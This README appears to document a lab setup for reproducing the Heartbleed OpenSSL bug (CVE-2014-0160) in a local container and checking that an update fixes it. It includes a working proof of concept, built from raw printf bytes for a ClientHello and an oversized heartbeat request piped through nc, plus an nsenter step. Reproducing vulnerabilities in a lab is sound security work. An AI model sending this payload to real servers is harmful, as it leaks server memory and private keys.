# CVE-2014-0160 (Heartbleed)

### Description
The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.


### Command to run
```shell
python decret.py --port 4433 --number 2014-0160 --release bullseye --directory heartbleed --selenium
```

### Simple testing method
In the container :
```shell
openssl req -x509 -newkey rsa:2048 -out cert.pem -keyout key.pem -keyform PEM -outform PEM -nodes
openssl s_server -tls1 -cert cert.pem -key key.pem
```
Then, on the host : 
```shell
( printf "\x16\x03\x01\x00\x38\x01\x00\x00\x34\x03\x01"
printf "\x00\x00\x00\x00\x00\x00\x00\x00" # Random
printf "\x00\x00\x00\x00\x00\x00\x00\x00" # Random
printf "\x00\x00\x00\x00\x00\x00\x00\x00" # Random
printf "\x00\x00\x00\x00\x00\x00\x00\x00" # Random
printf "\x00\x00\x06\x00\x05\x00\x35\x00\x39\x01\x00"
printf "\x00\x05\x00\x0f\x00\x01\x01" ) > chello.bin

printf "\x18\x03\x01\x00\x03\x01\xff\xff" > hb.bin

(cat chello.bin; sleep 3; cat hb.bin) | nc 127.0.0.1 4433 | hexdump -C
```

Since we redirected the 4433 port, we can easily connect to the
vulnerable server.  It is also possible to enter the network namespace
from the host if you do not want to redirect a port.  From the host,
you can do this as `root` and have access to the network stack from
the container while using the filesystem from the host:
```
# ps auxw | grep openssl
root     123456  [...] openssl s_server -tls1 -cert cert.pem -key key.pem
# nsenter -n /proc/123456/ns/net
```

We observe that a lot of data thus it is vulnerable.

If `openssl` is then updated in the container :
```shell
apt-get install openssl
```
And the exploit is tested again, only a few bytes are sent back. The vulnerability is fixed.
